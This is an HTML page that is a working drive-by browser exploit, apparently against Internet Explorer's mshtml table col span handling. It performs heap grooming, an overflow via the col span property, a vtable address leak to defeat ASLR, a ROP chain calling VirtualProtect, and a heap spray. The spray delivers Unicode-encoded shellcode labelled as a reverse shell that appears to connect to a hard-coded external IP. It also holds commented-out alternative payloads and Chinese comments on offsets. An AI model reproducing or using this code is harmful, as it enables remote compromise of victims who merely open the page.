 <html>
 <body>
<div id="test"></div>
<script type="text/javascript">

	var leak_index=-1;
	var dap="EEEE";
	while(dap.length<480) dap+=dap;
	var padding="AAAA";
	while(padding.length<480) padding+=padding;
	var filler="BBBB";
	while(filler.length<480) filler+=filler;

	var arry1=new Array();
	var arry2=new Array();

	var div_container=document.getElementById("test");
	div_container.style.cssText="display:none";

	for(var i=0;i<500;i+=2)
	{
		arry1[i]=dap.substring(0,(0x100-6)/2) //减去BSTR的头部4+结尾2字节，因为unicode编码除2
		arry2[i]=padding.substring(0,(0x100-6)/2)
		arry2[i+1]=filler.substring(0,(0x100-6)/2)
		Math.tan(1,2)
		var obj=document.createElement("button");
		div_container.appendChild(obj);
	}
	for(var i=200;i<500;i+=2)
	{
		arry1[i]=null;
		CollectGarbage();
	}
	
	//Math.cos(1,2);


 for (var i=200; i<500; i+=2 ) {
            arry1[i] = null;
            CollectGarbage();
        }
</script>
 <table style="table-layout:fixed" >
        <col id="132" width="41" span="9" >&nbsp </col>
 </table>
 <script>
 Math.sin(1,2)
 //1.Overflow

 var obj_col = document.getElementById("132");
        //obj_col.width = "41";
 obj_col.span = "19";
 //alert("overflow")
 
 setTimeout("Attack()",5);




 //Function

 //Math.tan(2,1);
function Attack(){
//2.Leak address
 for(var i=0;i<500;i++)
 {
       if(arry2[i].length>(0x100-6)/2)
        {
        		leak=arry2[i].substring((0x100-6)/2+(2+20)/2,(0x100-6)/2+(2+20+4)/2)
        		leak_addr = parseInt(leak.charCodeAt(1).toString(16)+leak.charCodeAt(0).toString(16),16);
            	//alert("vrftable="+leak_addr.toString(16));

            	var mshtml_addr=leak_addr-Number(0x00158690);
            	//alert("mshtml_addr="+mshtml_addr.toString(16));
            	
        }
 }



 //alert("Exploit...")
 HeapSpray(mshtml_addr);

//Jmp to ROP
  var obj_col = document.getElementById("132");
//	obj_col.width = "1178993";
//      obj_col.width="1010566"; //1010566*100-->0x6060058
//	obj_col.width="2021131"; //2021131*100-->0xc0c004c
	obj_col.width="1295152"; //1295152*100-->0x7B83EC0
 	obj_col.span = "29";
 
 }



function Int2Unicode(Number) {
		return ("%u"+Number.toString(16).substring(4,8)+"%u"+Number.toString(16).substring(0,4));
}
 
function HeapSpray(mshtml_addr)
{
	//CollectGarbage();
	ret=Number(0x0010d986)+mshtml_addr;
	pop_ret=Number(0x0010d985)+mshtml_addr;
	xchg_eax_esp=Number(0x00059237)+mshtml_addr; //ESP->0x7B83ECC
	push_eax=Number(0x0051ed4f)+mshtml_addr;
	pop_eax=Number(0x0006da81)+mshtml_addr;
	mov_eax_EAX=Number(0x004651e5)+mshtml_addr; // mov eax,[eax]
	virtual_protect=Number(0x1348)+mshtml_addr; //IAT->VirtualProtect
	//pop_pop_pop_ret=Number()+mshtml_addr;

//rop_chain start from -> 0x7B83EC0 
	rop_chain=unescape(Int2Unicode(ret)); 			//RET 			    <-------
	rop_chain+=unescape(Int2Unicode(pop_ret));			// POP RET				|
	//rop_chain+=unescape(Int2Unicode(xchg_eax_esp));
	rop_chain+=unescape(Int2Unicode(xchg_eax_esp)); 		//Stack Provit ESP--
	rop_chain+=unescape(Int2Unicode(pop_eax));
	rop_chain+=unescape(Int2Unicode(virtual_protect));
	rop_chain+=unescape(Int2Unicode(mov_eax_EAX));
	rop_chain+=unescape(Int2Unicode(push_eax));

	rop_chain+="\u3ef0\u07b8"//07b83ef0 -->shellcode_addr
		+"\u3e00\u07b8"//arg4
		+"\u1000\u0000"//arg3
		+"\u0040\u0000"//arg2
		+"\u3ee0\u07b8";//arg1


	var sc=rop_chain+"\uc933\ua164\u0030\u0000\u408b\u8b0c\u1470\u96ad\u8bad\u1058\u538b\u033c\u8bd3\u7852\ud303\uc933\u728b\u0320\u41f3\u03ad\u81c3\u4738\u7465\u7550\u81f4\u0478\u6f72\u4163\ueb75\u7881\u6408\u7264\u7565\u8be2\u2472\uf303\u8b66\u4e0c\u8b49\u1c72\uf303\u148b\u038e\u33d3\u53c9\u6652\u73b9\u5141\u6f68\u6563\u6873\u6574\u7250\u4368\u6572\u5461\uff53\u83d2\u10c4\u8b50\u2454\ub904\u6f66\u0041\u6851\u7075\u6e49\u7468\u7261\u6874\u6547\u5374\u5354\ud2ff\uc483\u5010\u548b\u0824\uc933\u6851\u7261\u4179\u4c68\u6269\u6872\u6f4c\u6461\u5354\ud2ff\uc483\u590c\u6650\u33b9\u5132\u7768\u3273\u545f\ud0ff\uc483\u5008\u548b\u1024\uc933\ub966\u7075\u6851\u6174\u7472\u5768\u4153\u5453\u74ff\u1024\ud2ff\uc483\u500c\u548b\u1424\u5c8b\u0424\uc933\ub966\u4174\u6851\u636f\u656b\u5768\u4153\u5453\uff53\u83d2\u0cc4\u8b50\u2454\u8b18\u245c\u3308\u68c9\u6365\u0074\u6368\u6e6f\u546e\uff53\u83d2\u08c4\u8b50\u2454\u8b1c\u245c\u330c\u66c9\u72b9\u5100\u5f68\u6461\u6864\u6e69\u7465\u5354\ud2ff\uc483\u500c\u548b\u2024\u5c8b\u1024\uc933\ub966\u0073\u6851\u7468\u6e6f\u5354\ud2ff\uc483\u5008\uec83\u8b20\u2444\u5430\u0268\u0002\uff00\u8bd0\u2444\u332c\u51c9\u5151\ub966\u0006\u6651\u01b9\u5100\u5141\ud0ff\u8b50\u2444\u3328\u66c9\u35b9\u5100\u3768\u2e34\u6837\u3937\u312e\u3168\u3032\u542e\ud0ff\uc483\u5010\u448b\u2824\u0a68\u001a\uff00\u8bd0\u2454\u6630\u6650\u02b8\u6600\u8b50\u6adc\u5310\u74ff\u1024\ud2ff\u748b\u0824\u5656\u3356\u33f6\u56c9\u6856\u0100\u0000\ub966\u000a\ue256\ub9fd\u0044\u0000\u8b51\u8bd4\u249c\u0090\u0000\u6568\u6578\u6800\u6d63\u2e64\uf48b\u5252\uc933\u5151\u4151\u8351\u01e9\u5151\u5156\ud3ff\u0050"//reverse shell

	//"\uc933\ua164\u0030\u0000\u408b\u8b0c\u1470\u96ad\u8bad\u1058\u538b\u033c\u8bd3\u7852\ud303\uc933\u728b\u0320\u41f3\u03ad\u81c3\u4738\u7465\u7550\u81f4\u0478\u6f72\u4163\ueb75\u7881\u6408\u7264\u7565\u8be2\u2472\uf303\u8b66\u4e0c\u8b49\u1c72\uf303\u148b\u038e\u33d3\u53c9\u5152\u6168\u7972\u6841\u694c\u7262\u4c68\u616f\u5464\uff53\u83d2\u0cc4\u5059\u6651\u6cb9\u516c\u3368\u2e32\u6864\u7375\u7265\uff54\u83d0\u10c4\u548b\u0424\uc933\u74b9\u6e6f\u5161\u6c83\u0324\u6861\u4265\u7475\u4d68\u756f\u6873\u7753\u7061\u5054\ud2ff\uc483\u3314\u51c9\ud0ff";//recover Mouse
	//"\uc933\ua164\u0030\u0000\u408b\u8b0c\u1470\u96ad\u8bad\u1058\u538b\u033c\u8bd3\u7852\ud303\uc933\u728b\u0320\u41f3\u03ad\u81c3\u4738\u7465\u7550\u81f4\u0478\u6f72\u4163\ueb75\u7881\u6408\u7264\u7565\u8be2\u2472\uf303\u8b66\u4e0c\u8b49\u1c72\uf303\u148b\u038e\u33d3\u53c9\u5152\u6168\u7972\u6841\u694c\u7262\u4c68\u616f\u5464\uff53\u83d2\u0cc4\u5059\u6651\u6cb9\u516c\u3368\u2e32\u6864\u7375\u7265\uff54\u83d0\u10c4\u548b\u0424\uc933\u74b9\u6e6f\u5161\u6c83\u0324\u6861\u4265\u7475\u4d68\u756f\u6873\u7753\u7061\u5054\ud2ff\uc483\u3314\u41c9\uff51\u00D0" //change Mouse

	//"\uc933\ua164\u0030\u0000\u408b\u8b0c\u1470\u96ad\u8bad\u1058\u538b\u033c\u8bd3\u7852\ud303\uc933\u728b\u0320\u41f3\u03ad\u81c3\u4738\u7465\u7550\u81f4\u0478\u6f72\u4163\ueb75\u7881\u6408\u7264\u7565\u8be2\u2472\uf303\u8b66\u4e0c\u8b49\u1c72\uf303\u148b\u038e\u33d3\u53c9\u5152\u6168\u7972\u6841\u694c\u7262\u4c68\u616f\u5464\uff53\u83d2\u0cc4\u5059\u6651\u6cb9\u516c\u3368\u2e32\u6864\u7375\u7265\uff54\u83d0\u10c4\u548b\u0424\uc933\u6f68\u4178\u6800\u6761\u4265\u4d68\u7365\u5473\uff50\ub9d2\u767f\u1111\ue981\u1111\u1111\u6851\u7267\u6961\u7968\u4d20\u6869\u6465\u6220\u6868\u6361\u686b\u7261\u2065\u5968\u756f\u8b20\u33dc\u51c9\u6168\u6e69\u6865\u694d\u7267\ud48b\uc933\u5251\u5153\ud0ff"; //Migraine

	//var sc=rop_chain+"\u1234\u5678\u9abc\u1122\u3344\u5566\u7788\u99aa\u4141\u4141\u4141\u4141\u4141\u4141";
	var nop="\u0c0c\u0c0c";
	var offset=0x3EA0/2-2;
	//var offset=(58-24-18); //58-24/2
	//var offset=0x5ee-4/2;//0xbdc/2-4/2
	//var offset=4
	//var offset=4
	//以0x10000为单位的shellcode+nop结构单元


	while(nop.length<0x10000)
		nop+=nop;
	
	var nop_chunk=nop.substring(0,(0x10000/2-sc.length)); //Unicode编码，所以0x10000/2个字节
	
	var sc_nop=sc+nop_chunk;


	//组合成单个大小为0x80000的堆块（heap-feng-shui)

	while(sc_nop.length<0x100000)
		sc_nop+=sc_nop;
	sc_nop=sc_nop.substring(0,(0x80000-6)/2-offset);//组合成0x800000的堆块
	//sc_nop=sc_nop.substring(0,(0x80000-6)/2);//组合成0x800000的堆块
	
	var offset_pattern=nop.substring(0,offset); 
	var code=offset_pattern+sc_nop;
	//var code=sc_nop;
	heap_chunks=new Array();
	for(i=0;i<400;i++)
	{
		heap_chunks[i]=code.substring(0,code.length);
	}
	//alert("HeapSpray")
}


 </script>
 </body>
 </html>
